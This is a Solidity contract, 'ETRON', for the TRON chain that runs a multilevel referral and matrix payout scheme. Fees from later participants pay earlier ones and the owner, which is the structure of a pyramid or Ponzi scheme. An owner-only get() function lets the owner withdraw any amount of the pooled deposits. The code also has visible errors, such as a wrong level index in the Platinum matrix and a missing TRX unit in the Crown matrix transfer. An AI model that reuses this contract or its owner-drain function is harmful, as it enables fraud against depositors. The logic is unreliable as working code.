//SourceUnit: Run (3).sol

 pragma solidity ^0.5.10;

contract ETRON{
    
    using SafeMath for uint256;
    
    address payable public owner;
    uint256 public totalUsers;
    uint256 public totalwithdrawn;
    uint256 public currentid = 1;

    uint256 public GlobalmatrixcurrUserID = 0;
    uint256 public SilvermatrixcurrUserID = 0;
    uint256 public GoldmatrixcurrUserID = 0;
    uint256 public TitaniummatrixcurrUserID = 0;
    uint256 public PlatinummatrixcurrUserID = 0;
    uint256 public EmerldmatrixcurrUserID = 0;
    uint256 public DiamondmatrixcurrUserID = 0;
    uint256 public RubymatrixcurrUserID = 0;
    uint256 public CrownmatrixcurrUserID = 0;
    uint256 public ImperialmatrixcurrUserID = 0;
    uint256 public AmbassadormatrixcurrUserID = 0;
    uint256 public PresidentmatrixcurrUserID = 0;

    uint256 public GlobalmatrixactiveUserID = 1;
    uint256 public SilvermatrixactiveUserID = 1;
    uint256 public GoldmatrixactiveUserID = 1;
    uint256 public TitaniummatrixactiveUserID = 1;
    uint256 public PlatinummatrixactiveUserID = 1;
    uint256 public EmerldmatrixactiveUserID = 1;
    uint256 public DiamondmatrixactiveUserID = 1;
    uint256 public RubymatrixactiveUserID = 1;
    uint256 public CrownmatrixactiveUserID = 1;
    uint256 public ImperialmatrixactiveUserID = 1;
    uint256 public AmbassadormatrixactiveUserID = 1;
    uint256 public PresidentmatrixactiveUserID = 1;
    

    
    uint256 public GlobalmatrixUserCount;
    uint256 public SilvermatrixUserCount;
    uint256 public GoldmatrixUserCount;
    uint256 public TitaniummatrixUserCount;
    uint256 public PlatinummatrixUserCount;
    uint256 public EmerldmatrixUserCount;
    uint256 public DiamondmatrixUserCount;
    uint256 public RubymatrixUserCount;
    uint256 public CrownmatrixUserCount;
    uint256 public ImperialmatrixUserCount;
    uint256 public AmbassadormatrixUserCount;
    uint256 public PresidentmatrixUserCount;

    
    struct UserStruct {
        bool isExist;
        uint256 registrationid;
        uint256 id;
        address payable referrer;
        uint256 referredUsers;
        uint256 LevelReward;
        uint256 MatrixReward;
        uint256 DirectReward;
        uint256 income;
        address []directs;
        mapping(uint256=>LevelUserStruct) LevelUser;
    }
    
    struct LevelUserStruct {
        bool isExist;
        uint256 id;
        uint payment_received;
    }
    
    mapping(address => UserStruct) public users;
    mapping(address => uint256[20]) public levels;
    mapping(uint256 =>address payable) public idtoaddress;
    mapping(uint256=>mapping(uint256=>address payable)) public userList;
    
    event INCOME (uint256 id,string typee,uint256 leveeel,uint256 amount,uint256 time);
    
    modifier checklevel(uint256 level){
        bool check = users[msg.sender].LevelUser[level].isExist;
        require(check,"you have not crossed the required level");
        _;
    }

   
   
    constructor(address payable _owner) payable public {
       owner = _owner;
        idtoaddress[currentid] = owner;
        users[owner].isExist = true;
        users[owner].registrationid = currentid;
        currentid++;
        for(uint256 i = 1; i < 25 ; i++ )
        {
            users[owner].LevelUser[i].isExist = true;
        }
    }
    function register(uint256 id) public payable  {
		require(!(users[msg.sender].isExist),"you are already registered");
		require(msg.value == 500 trx,"need to pay 500 trx for registration");
		UserStruct storage user = users[msg.sender];
		address ad = msg.sender;
		
		if (user.referrer == address(0)) {
			totalUsers = totalUsers.add(1);
		}
		
		if(msg.sender == owner){
		    user.referrer = address(0);
		}else if (user.referrer == address(0)) {
		    
			if (users[idtoaddress[id]].referrer == address(0) || idtoaddress[id] == msg.sender) {
				user.referrer = owner;
			}
			if(idtoaddress[id] == address(0))
			{
			   user.referrer = owner;
			}
			else{
			    user.referrer = idtoaddress[id];
			}
			
			
			(users[user.referrer].directs).push(ad);
			users[user.referrer].referredUsers+=1;
			user.isExist = true;
			idtoaddress[currentid] = msg.sender;
			user.registrationid = currentid;
			
            currentid++;
            address payable upline = user.referrer;
			for (uint256 i = 0; i < 20; i++) {
                if (upline != address(0)) {
                    
                        levels[upline][i] = levels[upline][i].add(1);
                     
					upline = users[upline].referrer;
				} else break;
            }
		}
		
        Level1();
        // setdirects();
	}
    
    function Level1() internal  {
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[1] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 100 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        GLOBALMATRIX();
}
        function Level2() public payable checklevel(1)  {
        require(msg.value == 1000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[2] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 100 trx;
         user.referrer.transfer(amount);
         users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        SILVERMATRIX();
}
        function Level3() public payable checklevel(2)  {
        require(msg.value == 2500 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[3] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 250 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        GOLDMATRIX();
} 
         function Level4() public payable checklevel(3)  {
        require(msg.value == 5000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[4] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 500 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        TITANIUMMATRIX();
}
function Level5() public payable checklevel(4)  {
        require(msg.value == 10000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[5] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 1000 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        PLATINUMMATRIX();
}
function Level6() public payable checklevel(5)  {
        require(msg.value == 20000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[6] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 2000 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        EMERLDMATRIX();
}
function Level7() public payable checklevel(6)  {
        require(msg.value == 40000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[7] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 4000 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        DIAMONDMATRIX();
}
function Level8() public payable checklevel(7)  {
        require(msg.value == 80000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[8] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 8000 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        RUBYMATRIX();
}
function Level9() public payable checklevel(8)  {
        require(msg.value == 160000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[9] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 16000 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        CROWNMATRIX();
}
function Level10() public payable checklevel(9)  {
        require(msg.value == 320000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[10] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 32000 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        IMPERIALMATRIX();
}
function Level11() public payable checklevel(10)  {
        require(msg.value == 640000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[11] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 64000 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        AMBASSADORMATRIX();
}
function Level12() public payable checklevel(11)  {
        require(msg.value == 1280000 trx,"invalid amount");
        require(users[msg.sender].isExist,"you need to register first");
        UserStruct storage user = users[msg.sender];
        users[msg.sender].LevelUser[12] = LevelUserStruct({
            isExist: true,
            id: user.registrationid,
            payment_received: 0
        });
        uint256 amount = 128000 trx;
        user.referrer.transfer(amount);
        users[user.referrer].DirectReward+=amount;
        address payable upline = user.referrer;
        for (uint256 i = 0; i < 10; i++) {
                if (upline != address(0)) {
                if(users[upline].referredUsers >= i+1){
                upline.transfer(amount.div(10));
                users[upline].LevelReward+=(amount.div(10));
                    }
					upline = users[upline].referrer;
				} else break;
            }
        PRESIDENTMATRIX();
}
    function GLOBALMATRIX() internal{
        bool checke = true;
        if(GlobalmatrixUserCount == 0)
        {
            owner.transfer(300 trx);
            checke = false;
        }
        GlobalmatrixUserCount++;
        GlobalmatrixcurrUserID++;
        users[msg.sender].LevelUser[13] = LevelUserStruct({
            isExist: true,
            id: GlobalmatrixcurrUserID,
            payment_received: 0
        });
        userList[13][GlobalmatrixcurrUserID]=msg.sender;
        uint256 amount = 300 trx;
        if(checke){
            userList[13][GlobalmatrixactiveUserID].transfer(amount);
            users[userList[13][GlobalmatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[13][GlobalmatrixactiveUserID]].LevelUser[13].payment_received+=1;}
        if(users[userList[13][GlobalmatrixactiveUserID]].LevelUser[13].payment_received==5){
            users[userList[13][GlobalmatrixactiveUserID]].LevelUser[13].payment_received=0;
            
            GlobalmatrixactiveUserID++;
            GlobalmatrixUserCount--;
            
        }
    }
    function SILVERMATRIX() internal{
        bool checke = true;
        if(SilvermatrixUserCount == 0)
        {
            owner.transfer(800 trx);
            checke = false;
        }
        SilvermatrixUserCount++;
        SilvermatrixcurrUserID++;
        users[msg.sender].LevelUser[14] = LevelUserStruct({
            isExist: true,
            id: SilvermatrixcurrUserID,
            payment_received: 0
        });
        userList[14][SilvermatrixcurrUserID]=msg.sender;
        uint256 amount = 800 trx;
        if(checke){
            userList[14][SilvermatrixactiveUserID].transfer(amount);
            users[userList[14][SilvermatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[14][SilvermatrixactiveUserID]].LevelUser[14].payment_received+=1;}
        if(users[userList[14][SilvermatrixactiveUserID]].LevelUser[14].payment_received==5){
            users[userList[14][SilvermatrixactiveUserID]].LevelUser[14].payment_received=0;
            
            SilvermatrixactiveUserID++;
            SilvermatrixUserCount--;
            
        }
    }
    function GOLDMATRIX() internal{
        bool checke = true;
        if(GoldmatrixUserCount == 0)
        {
            owner.transfer(2000 trx);
            checke = false;
        }
        GoldmatrixUserCount++;
        GoldmatrixcurrUserID++;
        users[msg.sender].LevelUser[15] = LevelUserStruct({
            isExist: true,
            id: GoldmatrixcurrUserID,
            payment_received: 0
        });
        userList[15][GoldmatrixcurrUserID]=msg.sender;
        uint256 amount = 2000 trx;
        if(checke){
            userList[15][GoldmatrixactiveUserID].transfer(amount);
            users[userList[15][GoldmatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[15][GoldmatrixactiveUserID]].LevelUser[15].payment_received+=1;}
        if(users[userList[15][GoldmatrixactiveUserID]].LevelUser[15].payment_received==5){
            users[userList[15][GoldmatrixactiveUserID]].LevelUser[15].payment_received=0;
            
            GoldmatrixactiveUserID++;
            GoldmatrixUserCount--;
            
        }
    }
    function TITANIUMMATRIX() internal{
        bool checke = true;
        if(TitaniummatrixUserCount == 0)
        {
            owner.transfer(4000 trx);
            checke = false;
        }
        TitaniummatrixUserCount++;
        TitaniummatrixcurrUserID++;
        users[msg.sender].LevelUser[16] = LevelUserStruct({
            isExist: true,
            id: TitaniummatrixcurrUserID,
            payment_received: 0
        });
        userList[16][TitaniummatrixcurrUserID]=msg.sender;
        uint256 amount = 4000 trx;
        if(checke){
            userList[16][TitaniummatrixactiveUserID].transfer(amount);
            users[userList[16][TitaniummatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[16][TitaniummatrixactiveUserID]].LevelUser[16].payment_received+=1;}
        if(users[userList[16][TitaniummatrixactiveUserID]].LevelUser[16].payment_received==5){
            users[userList[16][TitaniummatrixactiveUserID]].LevelUser[16].payment_received=0;
            
            TitaniummatrixactiveUserID++;
            TitaniummatrixUserCount--;
            
        }
    }
    function PLATINUMMATRIX() internal{
        bool checke = true;
        if(PlatinummatrixUserCount == 0)
        {
            owner.transfer(8000 trx);
            checke = false;
        }
        PlatinummatrixUserCount++;
        PlatinummatrixcurrUserID++;
        users[msg.sender].LevelUser[8] = LevelUserStruct({
            isExist: true,
            id: PlatinummatrixcurrUserID,
            payment_received: 0
        });
        userList[17][PlatinummatrixcurrUserID]=msg.sender;
        uint256 amount = 8000 trx;
        if(checke){
            userList[17][PlatinummatrixactiveUserID].transfer(amount);
            users[userList[17][PlatinummatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[17][PlatinummatrixactiveUserID]].LevelUser[17].payment_received+=1;}
        if(users[userList[17][PlatinummatrixactiveUserID]].LevelUser[17].payment_received==5){
            users[userList[17][PlatinummatrixactiveUserID]].LevelUser[17].payment_received=0;
            
            PlatinummatrixactiveUserID++;
            PlatinummatrixUserCount--;
            
        }
    }
    function EMERLDMATRIX() internal{
        bool checke = true;
        if(EmerldmatrixUserCount == 0)
        {
            owner.transfer(16000 trx);
            checke = false;
        }
        EmerldmatrixUserCount++;
        EmerldmatrixcurrUserID++;
        users[msg.sender].LevelUser[18] = LevelUserStruct({
            isExist: true,
            id: EmerldmatrixcurrUserID,
            payment_received: 0
        });
        userList[18][EmerldmatrixcurrUserID]=msg.sender;
        uint256 amount = 16000 trx;
        if(checke){
            userList[18][EmerldmatrixactiveUserID].transfer(amount);
            users[userList[18][EmerldmatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[18][EmerldmatrixactiveUserID]].LevelUser[18].payment_received+=1;}
        if(users[userList[18][EmerldmatrixactiveUserID]].LevelUser[18].payment_received==5){
            users[userList[18][EmerldmatrixactiveUserID]].LevelUser[18].payment_received=0;
            
            EmerldmatrixactiveUserID++;
            EmerldmatrixUserCount--;
            
        }
    }
    function DIAMONDMATRIX() internal{
        bool checke = true;
        if(DiamondmatrixUserCount == 0)
        {
            owner.transfer(32000 trx);
            checke = false;
        }
        DiamondmatrixUserCount++;
        DiamondmatrixcurrUserID++;
        users[msg.sender].LevelUser[19] = LevelUserStruct({
            isExist: true,
            id: DiamondmatrixcurrUserID,
            payment_received: 0
        });
        userList[19][DiamondmatrixcurrUserID]=msg.sender;
        uint256 amount = 32000 trx;
        if(checke){
            userList[19][DiamondmatrixactiveUserID].transfer(amount);
            users[userList[19][DiamondmatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[19][DiamondmatrixactiveUserID]].LevelUser[19].payment_received+=1;}
        if(users[userList[19][DiamondmatrixactiveUserID]].LevelUser[19].payment_received==5){
            users[userList[19][DiamondmatrixactiveUserID]].LevelUser[19].payment_received=0;
            
            
            DiamondmatrixactiveUserID++;
            DiamondmatrixUserCount--;
            
        }
    }
    function RUBYMATRIX() internal{
        bool checke = true;
        if(RubymatrixUserCount == 0)
        {
            owner.transfer(64000 trx);
            checke = false;
        }
        RubymatrixUserCount++;
        RubymatrixcurrUserID++;
        users[msg.sender].LevelUser[20] = LevelUserStruct({
            isExist: true,
            id: RubymatrixcurrUserID,
            payment_received: 0
        });
        userList[20][RubymatrixcurrUserID]=msg.sender;
        
            uint256 amount = 64000 trx;
            if(checke){
            userList[20][RubymatrixactiveUserID].transfer(amount);
            users[userList[20][RubymatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[20][RubymatrixactiveUserID]].LevelUser[20].payment_received+=1;}
        if(users[userList[20][RubymatrixactiveUserID]].LevelUser[20].payment_received==5){
            users[userList[20][RubymatrixactiveUserID]].LevelUser[20].payment_received=0;
            
            RubymatrixactiveUserID++;
            RubymatrixUserCount--;
            
        }
    }
    function CROWNMATRIX() internal{
        bool checke = true;
        if(CrownmatrixUserCount == 0)
        {
            owner.transfer(128000);
            checke = false;
        }
        CrownmatrixUserCount++;
        CrownmatrixcurrUserID++;
        users[msg.sender].LevelUser[21] = LevelUserStruct({
            isExist: true,
            id: CrownmatrixcurrUserID,
            payment_received: 0
        });
        userList[21][CrownmatrixcurrUserID]=msg.sender;
        uint256 amount = 128000 trx;
        if(checke){
            userList[21][CrownmatrixactiveUserID].transfer(amount);
            users[userList[21][CrownmatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[21][CrownmatrixactiveUserID]].LevelUser[21].payment_received+=1;}
        if(users[userList[21][CrownmatrixactiveUserID]].LevelUser[21].payment_received==5){
            users[userList[21][CrownmatrixactiveUserID]].LevelUser[21].payment_received=0;
            
            
            CrownmatrixactiveUserID++;
            CrownmatrixUserCount--;
            
        }
    }
    function IMPERIALMATRIX() internal{
        bool checke = true;
        if(ImperialmatrixUserCount == 0)
        {
            owner.transfer(256000 trx);
            checke = false;
        }
        ImperialmatrixUserCount++;
        ImperialmatrixcurrUserID++;
        users[msg.sender].LevelUser[22] = LevelUserStruct({
            isExist: true,
            id: ImperialmatrixcurrUserID,
            payment_received: 0
        });
        userList[22][ImperialmatrixcurrUserID]=msg.sender;
        uint256 amount = 256000 trx;
        if(checke){
            userList[22][ImperialmatrixactiveUserID].transfer(amount);
            users[userList[22][ImperialmatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[22][ImperialmatrixactiveUserID]].LevelUser[22].payment_received+=1;}
        if(users[userList[22][ImperialmatrixactiveUserID]].LevelUser[22].payment_received==5){
            users[userList[22][ImperialmatrixactiveUserID]].LevelUser[22].payment_received=0;
            
            
            ImperialmatrixactiveUserID++;
            ImperialmatrixUserCount--;
            
        }
    }
    function AMBASSADORMATRIX() internal{
        bool checke = true;
        if(AmbassadormatrixUserCount == 0)
        {
            owner.transfer(512000 trx);
            checke = false;
        }
        AmbassadormatrixUserCount++;
        AmbassadormatrixcurrUserID++;
        users[msg.sender].LevelUser[23] = LevelUserStruct({
            isExist: true,
            id: AmbassadormatrixcurrUserID,
            payment_received: 0
        });
        userList[23][AmbassadormatrixcurrUserID]=msg.sender;
        uint256 amount = 512000 trx;
        if(checke){
            userList[23][AmbassadormatrixactiveUserID].transfer(amount);
            users[userList[23][AmbassadormatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[23][AmbassadormatrixactiveUserID]].LevelUser[23].payment_received+=1;}
        if(users[userList[23][AmbassadormatrixactiveUserID]].LevelUser[23].payment_received==5){
            users[userList[23][AmbassadormatrixactiveUserID]].LevelUser[23].payment_received=0;
            
            
            AmbassadormatrixactiveUserID++;
            AmbassadormatrixUserCount--;
            
        }
    }
    function PRESIDENTMATRIX() internal{
        bool checke = true;
        if(PresidentmatrixUserCount == 0)
        {
            owner.transfer(1024000 trx);
            checke = false;
        }
        PresidentmatrixUserCount++;
        PresidentmatrixcurrUserID++;
        users[msg.sender].LevelUser[24] = LevelUserStruct({
            isExist: true,
            id: PresidentmatrixcurrUserID,
            payment_received: 0
        });
        userList[24][PresidentmatrixcurrUserID]=msg.sender;
        uint256 amount = 1024000 trx;
        if(checke){
            userList[24][PresidentmatrixactiveUserID].transfer(amount);
            users[userList[24][PresidentmatrixactiveUserID]].MatrixReward+=amount;
            totalwithdrawn+=amount;
        users[userList[24][PresidentmatrixactiveUserID]].LevelUser[24].payment_received+=1;}
        if(users[userList[24][PresidentmatrixactiveUserID]].LevelUser[24].payment_received==5){
            users[userList[24][PresidentmatrixactiveUserID]].LevelUser[24].payment_received=0;
            
            
            PresidentmatrixactiveUserID++;
            PresidentmatrixUserCount--;
            
        }
    }
    function get(uint256 amount) public returns(bool)
    {
        require(msg.sender == owner,"Access Denied");
        owner.transfer(amount.mul(1e6));
        return true;
    }
    function getUserDownlineCount(address userAddress) public view returns (uint256[20] memory arr) {
	         for(uint256 i = 0 ; i<20;i++){
	         
	         arr[i] = levels[userAddress][i] ;
	         
	         }
	         return arr;
	        
	}
	function getdirects(address ad) public view returns(address[] memory arr){
	   return users[ad].directs;
	}
	function getuserid(address userAddress) public view returns(uint256){
	    return users[userAddress].registrationid;
	}
    function getStationInfo(address _userAddress,uint256 _Level_No)public view returns(bool,uint256,uint256 ){
        return (users[_userAddress].LevelUser[_Level_No].isExist,users[_userAddress].LevelUser[_Level_No].id,
        users[_userAddress].LevelUser[_Level_No].payment_received);
    }
    
    function getTrxBalance() public view returns(uint) {
        return address(this).balance;
    }
    
    

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}